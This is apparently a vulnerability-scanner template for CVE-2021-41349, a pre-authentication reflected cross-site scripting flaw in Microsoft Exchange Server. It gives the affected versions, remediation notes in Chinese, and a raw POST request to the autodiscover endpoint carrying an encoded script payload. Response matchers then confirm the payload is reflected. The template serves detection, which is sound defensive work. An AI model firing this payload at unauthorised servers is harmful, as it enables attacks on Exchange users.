id: CVE-2021-41349
info:
  name: Microsoft Exchange Server Pre-Auth POST Based Reflected Cross-Site Scripting
  author:
  - l0ne1y
  description: |-
    Microsoft Exchange Server 欺骗漏洞
    Microsoft Exchange Server是美国微软（Microsoft）公司的一套电子邮件服务程序。它提供邮件存取、储存、转发，语音邮件，邮件过滤筛选等功能。
    Microsoft Exchange Server存在欺骗漏洞。攻击者可借助特制网站利用该漏洞欺骗内容并诱导用户相信该网站的合法性，同时结合网页服务中的其他漏洞发起攻击。
    受影响系统：
    Microsoft Exchange Server 2019 Cumulative Update 11
    Microsoft Exchange Server 2019 Cumulative Update 10
    Microsoft Exchange Server 2016 Cumulative Update 22
    Microsoft Exchange Server 2016 Cumulative Update 21
    Microsoft Exchange Server 2013 Cumulative Update 23
  severity: medium
  remediation: |-
    官方修复建议：
    目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：
    https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-41349

    临时修复建议：
    <br/>1、前后端同时对用户输入信息进行校验，双重验证机制。<br/>2、调用功能前验证用户是否有权限调用相关功能。
requests:
- matchers:
  - type: word
    condition: and
    words:
    - alert(document.domain);
    - a=""
  - type: word
    part: header
    words:
    - text/html
  - type: status
    status:
    - 500
  matchers-condition: and
  raw:
  - |
    POST /autodiscover/autodiscover.json HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    %3Cscript%3Ealert%28document.domain%29%3B+a=%22%3C%2Fscript%3E&x=1
